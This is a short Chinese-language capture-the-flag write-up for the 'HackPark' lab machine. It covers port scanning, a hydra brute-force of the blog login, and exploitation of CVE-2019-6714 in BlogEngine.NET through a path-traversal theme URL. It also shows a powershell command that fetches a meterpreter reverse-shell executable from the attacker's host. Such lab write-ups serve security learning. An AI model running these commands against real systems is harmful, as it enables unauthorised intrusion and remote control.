# HackPark

循例 nmap 扫，带-Pn参数

<pre><font color="#367BF0">┌──(</font><font color="#EC0101"><b>root💀kali</b></font><font color="#367BF0">)-[</font><b>/home/sugobet</b><font color="#367BF0">]</font>
<font color="#367BF0">└─</font><font color="#EC0101"><b>#</b></font> <font color="#5EBDAB">nmap</font> 10.10.161.251 <font color="#9755B3">-Pn</font></pre>

只开了80和3389

上web看看，

题目提问网站的小丑图片中的小丑叫什么名字
网站上找不到，把图片也下载下载strings看看有没有东西，很遗憾没有

然后通过社交得知，这是一部电影 小丑回魂中的🤡，百度得知名字

    Pennywise

在刚刚找名字的时候找到了后台登录页面

题目要求使用hydra爆破

    hydra -l <username> -P .<password list> $ip -V http-form-post '/wp-login.php：log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1：S=Location'

<pre>[<font color="#47D4B9"><b>80</b></font>][<font color="#47D4B9"><b>http-post-form</b></font>] host: <font color="#47D4B9"><b>10.10.161.251</b></font>   login: <font color="#47D4B9"><b>admin</b></font>   password: <font color="#47D4B9"><b>1qaz2wsx</b></font></pre>

hydra爆web稍微确实是麻烦了点，直接用burp会更方便

收集到信息:BlogEngine.NET v3.3.6.0

    searchsploit BlogEngine.NET

CVE-2019-6714

存在任意文件上传/rce/目录穿越

将payload的ip和port修改为我们的，并且将文件名修改为

    PostView.ascx

上传后，netcat开启监听，并访问：

    http://10.10.161.251/?theme=../../App_Data/files

成功getshell

题目要求使用metasploit，首先使用msfvenom生成payload

攻击机开启http服务，目标上使用powershell下载payload

    powershell -c "wget http://10.11.17.14:8000/windows-tools_and_exp/meterpreter_rev_she11.exe"

msfconsole开启监听

目标上运行：

    meterpreter_rev_she11.exe

对windows方面比较差，后面看着别人的wp做.......
